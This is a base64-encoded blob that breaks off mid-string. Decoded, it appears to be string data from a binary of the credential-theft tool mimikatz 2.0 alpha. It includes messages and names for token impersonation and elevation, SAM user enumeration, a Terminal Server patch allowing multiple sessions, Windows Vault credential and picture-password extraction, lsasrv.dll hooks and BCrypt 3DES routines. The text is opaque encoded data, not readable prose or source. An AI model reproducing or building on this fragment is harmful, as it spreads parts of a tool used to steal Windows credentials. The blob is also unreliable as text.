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AUwB0AGEAcgB0ACAAYQAgAHAAcgBvAGMAZQBzAHMAAABzAHQAYQByAHQAAAAAAAAATABpAHMAdAAgAGkAbQBwAG8AcgB0AHMAAAAAAAAAAABpAG0AcABvAHIAdABzAAAATABpAHMAdAAgAGUAeABwAG8AcgB0AHMAAAAAAAAAAABlAHgAcABvAHIAdABzAAAAUAByAG8AYwBlAHMAcwAgAG0AbwBkAHUAbABlAAAAAABUAHIAeQBpAG4AZwAgAHQAbwAgAHMAdABhAHIAdAAgACIAJQBzACIAIAA6ACAAAABPAEsAIAAhACAAKABQAEkARAAgACUAdQApAAoAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcAByAG8AYwBlAHMAcwBfAHMAdABhAHIAdAAgADsAIABrAHUAbABsAF8AbQBfAHAAcgBvAGMAZQBzAHMAXwBjAHIAZQBhAHQAZQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAATgB0AFQAZQByAG0AaQBuAGEAdABlAFAAcgBvAGMAZQBzAHMAAAAAAE4AdABTAHUAcwBwAGUAbgBkAFAAcgBvAGMAZQBzAHMAAAAAAAAAAABOAHQAUgBlAHMAdQBtAGUAUAByAG8AYwBlAHMAcwAAACUAcwAgAG8AZgAgACUAdQAgAFAASQBEACAAOgAgAE8ASwAgACEACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcAByAG8AYwBlAHMAcwBfAGcAZQBuAGUAcgBpAGMATwBwAGUAcgBhAHQAaQBvAG4AIAA7ACAAJQBzACAAMAB4ACUAMAA4AHgACgAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHAAcgBvAGMAZQBzAHMAXwBnAGUAbgBlAHIAaQBjAE8AcABlAHIAYQB0AGkAbwBuACAAOwAgAE8AcABlAG4AUAByAG8AYwBlAHMAcwAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcAByAG8AYwBlAHMAcwBfAGcAZQBuAGUAcgBpAGMATwBwAGUAcgBhAHQAaQBvAG4AIAA7ACAAcABpAGQAIAAoAC8AcABpAGQAOgAxADIAMwApACAAaQBzACAAbQBpAHMAcwBpAG4AZwAAAAAAAAAlAHUACQAlAHcAWgAKAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHAAcgBvAGMAZQBzAHMAXwBjAGEAbABsAGIAYQBjAGsAUAByAG8AYwBlAHMAcwAgADsAIABPAHAAZQBuAFAAcgBvAGMAZQBzAHMAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcAByAG8AYwBlAHMAcwBfAGMAYQBsAGwAYgBhAGMAawBQAHIAbwBjAGUAcwBzACAAOwAgAGsAdQBsAGwAXwBtAF8AbQBlAG0AbwByAHkAXwBvAHAAZQBuACAAKAAwAHgAJQAwADgAeAApAAoAAAAKACUAdwBaAAAAAAAAAAAACgAJACUAcAAgAC0APgAgACUAdQAAAAAACQAlAHUAAAAJACAAAAAAAAkAJQBwAAAACQAlAFMAAAAJAC0APgAgACUAUwAAAAAACgAJACUAcAAgAC0APgAgACUAcAAJACUAUwAgACEAIAAAAAAAJQBTAAAAAAAAAAAAIwAlAHUAAABMAGkAcwB0ACAAcwBlAHIAdgBpAGMAZQBzAAAAAAAAAFIAZQBzAHUAbQBlACAAcwBlAHIAdgBpAGMAZQAAAAAAUwB1AHMAcABlAG4AZAAgAHMAZQByAHYAaQBjAGUAAABTAHQAbwBwACAAcwBlAHIAdgBpAGMAZQAAAAAAAAAAAFIAZQBtAG8AdgBlACAAcwBlAHIAdgBpAGMAZQAAAAAAUwB0AGEAcgB0ACAAcwBlAHIAdgBpAGMAZQAAAAAAAABTAGUAcgB2AGkAYwBlACAAbQBvAGQAdQBsAGUAAAAAAHMAZQByAHYAaQBjAGUAAAAlAHMAIAAnACUAcwAnACAAcwBlAHIAdgBpAGMAZQAgADoAIAAAAAAATwBLAAoAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGcAZQBuAGUAcgBpAGMARgB1AG4AYwB0AGkAbwBuACAAOwAgAFMAZQByAHYAaQBjAGUAIABvAHAAZQByAGEAdABpAG8AbgAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAAABFAFIAUgBPAFIAIABnAGUAbgBlAHIAaQBjAEYAdQBuAGMAdABpAG8AbgAgADsAIABNAGkAcwBzAGkAbgBnACAAcwBlAHIAdgBpAGMAZQAgAG4AYQBtAGUAIABhAHIAZwB1AG0AZQBuAHQACgAAAAAAUwB0AGEAcgB0AGkAbgBnAAAAAAAAAAAAUgBlAG0AbwB2AGkAbgBnAAAAAAAAAAAAUwB0AG8AcABwAGkAbgBnAAAAAAAAAAAAUwB1AHMAcABlAG4AZABpAG4AZwAAAAAAUgBlAHMAdQBtAGkAbgBnAAAAAAAAAAAAAAAAAAAAAABEAGkAcwBwAGwAYQB5ACAAcwBvAG0AZQAgAHYAZQByAHMAaQBvAG4AIABpAG4AZgBvAHIAbQBhAHQAaQBvAG4AcwAAAAAAAAB2AGUAcgBzAGkAbwBuAAAAAAAAAAAAAABMAG8AZwAgAG0AaQBtAGkAawBhAHQAegAgAGkAbgBwAHUAdAAvAG8AdQB0AHAAdQB0ACAAdABvACAAZgBpAGwAZQAAAAAAAAAAAAAAAAAAAFMAbABlAGUAcAAgAGEAbgAgAGEAbQBvAHUAbgB0ACAAbwBmACAAbQBpAGwAbABpAHMAZQBjAG8AbgBkAHMAAABzAGwAZQBlAHAAAAAAAAAAQQBuAHMAdwBlAHIAIAB0AG8AIAB0AGgAZQAgAFUAbAB0AGkAbQBhAHQAZQAgAFEAdQBlAHMAdABpAG8AbgAgAG8AZgAgAEwAaQBmAGUALAAgAHQAaABlACAAVQBuAGkAdgBlAHIAcwBlACwAIABhAG4AZAAgAEUAdgBlAHIAeQB0AGgAaQBuAGcAAAAAAAAAYQBuAHMAdwBlAHIAAAAAAEMAbABlAGEAcgAgAHMAYwByAGUAZQBuACAAKABkAG8AZQBzAG4AJwB0ACAAdwBvAHIAawAgAHcAaQB0AGgAIAByAGUAZABpAHIAZQBjAHQAaQBvAG4AcwAsACAAbABpAGsAZQAgAFAAcwBFAHgAZQBjACkAAAAAAGMAbABzAAAAUQB1AGkAdAAgAG0AaQBtAGkAawBhAHQAegAAAAAAAABlAHgAaQB0AAAAAAAAAAAAQgBhAHMAaQBjACAAYwBvAG0AbQBhAG4AZABzACAAKABkAG8AZQBzACAAbgBvAHQAIAByAGUAcQB1AGkAcgBlACAAbQBvAGQAdQBsAGUAIABuAGEAbQBlACkAAAAAAAAAUwB0AGEAbgBkAGEAcgBkACAAbQBvAGQAdQBsAGUAAABzAHQAYQBuAGQAYQByAGQAAAAAAAAAAABCAHkAZQAhAAoAAAAAAAAANAAyAC4ACgAAAAAAAAAAAFMAbABlAGUAcAAgADoAIAAlAHUAIABtAHMALgAuAC4AIAAAAAAAAABFAG4AZAAgACEACgAAAAAAbQBpAG0AaQBrAGEAdAB6AC4AbABvAGcAAAAAAAAAAABVAHMAaQBuAGcAIAAnACUAcwAnACAAZgBvAHIAIABsAG8AZwBmAGkAbABlACAAOgAgACUAcwAKAAAAAAA2ADQAAAAAAAAAAAAAAAAAAAAAAAoAbQBpAG0AaQBrAGEAdAB6ACAAMgAuADAAIABhAGwAcABoAGEAIAAoAGEAcgBjAGgAIAB4ADYANAApAAoATgBUACAAIAAgACAAIAAtACAAIABXAGkAbgBkAG8AdwBzACAATgBUACAAJQB1AC4AJQB1ACAAYgB1AGkAbABkACAAJQB1ACAAKABhAHIAYwBoACAAeAAlAHMAKQAKAAAAAABQAHIAaQBtAGEAcgB5AAAAVQBuAGsAbgBvAHcAbgAAAEQAZQBsAGUAZwBhAHQAaQBvAG4AAAAAAEkAbQBwAGUAcgBzAG8AbgBhAHQAaQBvAG4AAAAAAAAASQBkAGUAbgB0AGkAZgBpAGMAYQB0AGkAbwBuAAAAAABBAG4AbwBuAHkAbQBvAHUAcwAAAAAAAABSAGUAdgBlAHIAdAAgAHQAbwAgAHAAcgBvAGMAZQBzACAAdABvAGsAZQBuAAAAAAByAGUAdgBlAHIAdAAAAAAASQBtAHAAZQByAHMAbwBuAGEAdABlACAAYQAgAHQAbwBrAGUAbgAAAGUAbABlAHYAYQB0AGUAAABMAGkAcwB0ACAAYQBsAGwAIAB0AG8AawBlAG4AcwAgAG8AZgAgAHQAaABlACAAcwB5AHMAdABlAG0AAAAAAAAARABpAHMAcABsAGEAeQAgAGMAdQByAHIAZQBuAHQAIABpAGQAZQBuAHQAaQB0AHkAAAAAAAAAAAB3AGgAbwBhAG0AaQAAAAAAVABvAGsAZQBuACAAbQBhAG4AaQBwAHUAbABhAHQAaQBvAG4AIABtAG8AZAB1AGwAZQAAAAAAAAB0AG8AawBlAG4AAAAAAAAAIAAqACAAUAByAG8AYwBlAHMAcwAgAFQAbwBrAGUAbgAgADoAIAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AdABvAGsAZQBuAF8AdwBoAG8AYQBtAGkAIAA7ACAATwBwAGUAbgBQAHIAbwBjAGUAcwBzAFQAbwBrAGUAbgAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAgACoAIABUAGgAcgBlAGEAZAAgAFQAbwBrAGUAbgAgACAAOgAgAAAAbgBvACAAdABvAGsAZQBuAAoAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwB0AG8AawBlAG4AXwB3AGgAbwBhAG0AaQAgADsAIABPAHAAZQBuAFQAaAByAGUAYQBkAFQAbwBrAGUAbgAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAGQAbwBtAGEAaQBuAGEAZABtAGkAbgAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwB0AG8AawBlAG4AXwBsAGkAcwB0AF8AbwByAF8AZQBsAGUAdgBhAHQAZQAgADsAIABrAHUAbABsAF8AbQBfAGwAbwBjAGEAbABfAGQAbwBtAGEAaQBuAF8AdQBzAGUAcgBfAGcAZQB0AEMAdQByAHIAZQBuAHQARABvAG0AYQBpAG4AUwBJAEQAIAAoADAAeAAlADAAOAB4ACkACgAAAHMAeQBzAHQAZQBtAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AdABvAGsAZQBuAF8AbABpAHMAdABfAG8AcgBfAGUAbABlAHYAYQB0AGUAIAA7ACAATgBvACAAdQBzAGUAcgBuAGEAbQBlACAAYQB2AGEAaQBsAGEAYgBsAGUAIAB3AGgAZQBuACAAUwBZAFMAVABFAE0ACgAAAFQAbwBrAGUAbgAgAEkAZAAgACAAOgAgACUAdQAKAFUAcwBlAHIAIABuAGEAbQBlACAAOgAgACUAcwAKAFMASQBEACAAbgBhAG0AZQAgACAAOgAgAAAAAAAlAHMAXAAlAHMACgAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHQAbwBrAGUAbgBfAGwAaQBzAHQAXwBvAHIAXwBlAGwAZQB2AGEAdABlACAAOwAgAGsAdQBsAGwAXwBtAF8AdABvAGsAZQBuAF8AZwBlAHQATgBhAG0AZQBEAG8AbQBhAGkAbgBGAHIAbwBtAFMASQBEACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AdABvAGsAZQBuAF8AbABpAHMAdABfAG8AcgBfAGUAbABlAHYAYQB0AGUAIAA7ACAAawB1AGwAbABfAG0AXwBsAG8AYwBhAGwAXwBkAG8AbQBhAGkAbgBfAHUAcwBlAHIAXwBDAHIAZQBhAHQAZQBXAGUAbABsAEsAbgBvAHcAbgBTAGkAZAAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AdABvAGsAZQBuAF8AcgBlAHYAZQByAHQAIAA7ACAAUwBlAHQAVABoAHIAZQBhAGQAVABvAGsAZQBuACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAAAlAC0AMQAwAHUACQAAAAAAJQBzAFwAJQBzAAkAJQBzAAAAAAAAAAAACQAoACUAMAAyAHUAZwAsACUAMAAyAHUAcAApAAkAJQBzAAAAAAAAACAAKAAlAHMAKQAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHQAbwBrAGUAbgBfAGwAaQBzAHQAXwBvAHIAXwBlAGwAZQB2AGEAdABlAF8AYwBhAGwAbABiAGEAYwBrACAAOwAgAEMAaABlAGMAawBUAG8AawBlAG4ATQBlAG0AYgBlAHIAcwBoAGkAcAAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAJQB1AAkAAAAgAC0APgAgAEkAbQBwAGUAcgBzAG8AbgBhAHQAZQBkACAAIQAKAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwB0AG8AawBlAG4AXwBsAGkAcwB0AF8AbwByAF8AZQBsAGUAdgBhAHQAZQBfAGMAYQBsAGwAYgBhAGMAawAgADsAIABTAGUAdABUAGgAcgBlAGEAZABUAG8AawBlAG4AIAAoADAAeAAlADAAOAB4ACkACgAAAAAAWwBlAHgAcABlAHIAaQBtAGUAbgB0AGEAbABdACAAcABhAHQAYwBoACAAVABlAHIAbQBpAG4AYQBsACAAUwBlAHIAdgBlAHI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AcgBlAFAAYQBzAHMAdwBvAHIAZABPAHIAQgBpAG8AbQBlAHQAcgBpAGMAIAA7ACAAawB1AGwAbABfAG0AXwB0AG8AawBlAG4AXwBnAGUAdABOAGEAbQBlAEQAbwBtAGEAaQBuAEYAcgBvAG0AUwBJAEQAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAAAAUwBPAEYAVABXAEEAUgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAQQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuAFwATABvAGcAbwBuAFUASQBcAFAAaQBjAHQAdQByAGUAUABhAHMAcwB3AG8AcgBkAAAAAAAAAAAAYgBnAFAAYQB0AGgAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwB2AGEAdQBsAHQAXwBsAGkAcwB0AF8AZABlAHMAYwBJAHQAZQBtAF8AUABJAE4ATABvAGcAbwBuAE8AcgBQAGkAYwB0AHUAcgBlAFAAYQBzAHMAdwBvAHIAZABPAHIAQgBpAG8AbQBlAHQAcgBpAGMAIAA7ACAAUgBlAGcAUQB1AGUAcgB5AFYAYQBsAHUAZQBFAHgAIAAyACAAOgAgACUAMAA4AHgACgAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AdgBhAHUAbAB0AF8AbABpAHMAdABfAGQAZQBzAGMASQB0AGUAbQBfAFAASQBOAEwAbwBnAG8AbgBPAHIAUABpAGMAdAB1AHIAZQBQAGEAcwBzAHcAbwByAGQATwByAEIAaQBvAG0AZQB0AHIAaQBjACAAOwAgAFIAZQBnAFEAdQBlAHIAeQBWAGEAbAB1AGUARQB4ACAAMQAgADoAIAAlADAAOAB4AAoAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHYAYQB1AGwAdABfAGwAaQBzAHQAXwBkAGUAcwBjAEkAdABlAG0AXwBQAEkATgBMAG8AZwBvAG4ATwByAFAAaQBjAHQAdQByAGUAUABhAHMAcwB3AG8AcgBkAE8AcgBCAGkAbwBtAGUAdAByAGkAYwAgADsAIABSAGUAZwBPAHAAZQBuAEsAZQB5AEUAeAAgAFMASQBEACAAOgAgACUAMAA4AHgACgAAAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwB2AGEAdQBsAHQAXwBsAGkAcwB0AF8AZABlAHMAYwBJAHQAZQBtAF8AUABJAE4ATABvAGcAbwBuAE8AcgBQAGkAYwB0AHUAcgBlAFAAYQBzAHMAdwBvAHIAZABPAHIAQgBpAG8AbQBlAHQAcgBpAGMAIAA7ACAAQwBvAG4AdgBlAHIAdABTAGkAZABUAG8AUwB0AHIAaQBuAGcAUwBpAGQAIAAoADAAeAAlADAAOAB4ACkACgAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AdgBhAHUAbAB0AF8AbABpAHMAdABfAGQAZQBzAGMASQB0AGUAbQBfAFAASQBOAEwAbwBnAG8AbgBPAHIAUABpAGMAdAB1AHIAZQBQAGEAcwBzAHcAbwByAGQATwByAEIAaQBvAG0AZQB0AHIAaQBjACAAOwAgAFIAZQBnAE8AcABlAG4ASwBlAHkARQB4ACAAUABpAGMAdAB1AHIAZQBQAGEAcwBzAHcAbwByAGQAIAA6ACAAJQAwADgAeAAKAAAAAAAAAAAACQAJAFAAYQBzAHMAdwBvAHIAZAAgACAAIAAgACAAIAAgACAAOgAgAAAAAAAAAAAACQAJAFAASQBOACAAQwBvAGQAZQAgACAAIAAgACAAIAAgACAAOgAgACUAMAA0AGgAdQAKAAAAAAAJAAkAQgBhAGMAawBnAHIAbwB1AG4AZAAgAHAAYQB0AGgAIAA6ACAAJQBzAAoAAAAAAAAAAAAAAAkACQBQAGkAYwB0AHUAcgBlACAAcABhAHMAcwB3AG8AcgBkACAAKABnAHIAaQBkACAAaQBzACAAMQA1ADAAKgAxADAAMAApAAoAAAAAAAAACQAJACAAWwAlAHUAXQAgAAAAAAAAAAAAcABvAGkAbgB0ACAAIAAoAHgAIAA9ACAAJQAzAHUAIAA7ACAAeQAgAD0AIAAlADMAdQApAAAAAABjAGwAbwBjAGsAdwBpAHMAZQAAAAAAAABhAG4AdABpAGMAbABvAGMAawB3AGkAcwBlAAAAAAAAAAAAAAAAAAAAYwBpAHIAYwBsAGUAIAAoAHgAIAA9ACAAJQAzAHUAIAA7ACAAeQAgAD0AIAAlADMAdQAgADsAIAByACAAPQAgACUAMwB1ACkAIAAtACAAJQBzAAAAAAAAAAAAAAAAAAAAbABpAG4AZQAgACAAIAAoAHgAIAA9ACAAJQAzAHUAIAA7ACAAeQAgAD0AIAAlADMAdQApACAALQA+ACAAKAB4ACAAPQAgACUAMwB1ACAAOwAgAHkAIAA9ACAAJQAzAHUAKQAAAAAAAAAlAHUACgAAAAkACQBQAHIAbwBwAGUAcgB0AHkAIAAgACAAIAAgACAAIAAgADoAIAAAAAAAAAAAACUALgAqAHMAXAAAAAAAAAAlAC4AKgBzAAAAAAAAAAAAdABvAGQAbwAgAD8ACgAAAAkATgBhAG0AZQAgACAAIAAgACAAIAAgADoAIAAlAHMACgAAAAAAAAB0AGUAbQBwACAAdgBhAHUAbAB0AAAAAAAJAFAAYQB0AGgAIAAgACAAIAAgACAAIAA6ACAAJQBzAAoAAAAAAAAAJQBoAHUAAAAlAHUAAAAAAFsAVAB5AHAAZQAgACUAdQBdACAAAAAAAD8AIAAoAHQAeQBwAGUAIAA+ACAAQwBSAEUARABfAFQAWQBQAEUAXwBNAEEAWABJAE0AVQBNACkAAAAAAAAAAAA8AE4AVQBMAEwAPgAAAAAAVABhAHIAZwBlAHQATgBhAG0AZQAgADoAIAAlAHMAIAAvACAAJQBzAAoAVQBzAGUAcgBOAGEAbQBlACAAIAAgADoAIAAlAHMACgBDAG8AbQBtAGUAbgB0ACAAIAAgACAAOgAgACUAcwAKAFQAeQBwAGUAIAAgACAAIAAgACAAIAA6ACAAJQB1ACAALQAgACUAcwAKAEMAcgBlAGQAZQBuAHQAaQBhAGwAIAA6ACAAAAAKAAoAAAAAAGwAcwBhAHMAcgB2AAAAAABsAHMAYQBzAHIAdgAuAGQAbABsAAAAAABMc2FJQ2FuY2VsTm90aWZpY2F0aW9uAABMc2FJUmVnaXN0ZXJOb3RpZmljYXRpb24AAAAAAAAAAGIAYwByAHkAcAB0AAAAAABCQ3J5cHRPcGVuQWxnb3JpdGhtUHJvdmlkZXIAAAAAAEJDcnlwdFNldFByb3BlcnR5AAAAAAAAAEJDcnlwdEdldFByb3BlcnR5AAAAAAAAAEJDcnlwdEdlbmVyYXRlU3ltbWV0cmljS2V5AAAAAAAAQkNyeXB0RW5jcnlwdAAAAEJDcnlwdERlY3J5cHQAAABCQ3J5cHREZXN0cm95S2V5AAAAAAAAAABCQ3J5cHRDbG9zZUFsZ29yaXRobVByb3ZpZGVyAAAAADMARABFAFMAAAAAAAAAAABDAGgAYQBpAG4AaQBuAGcATQBvAGQ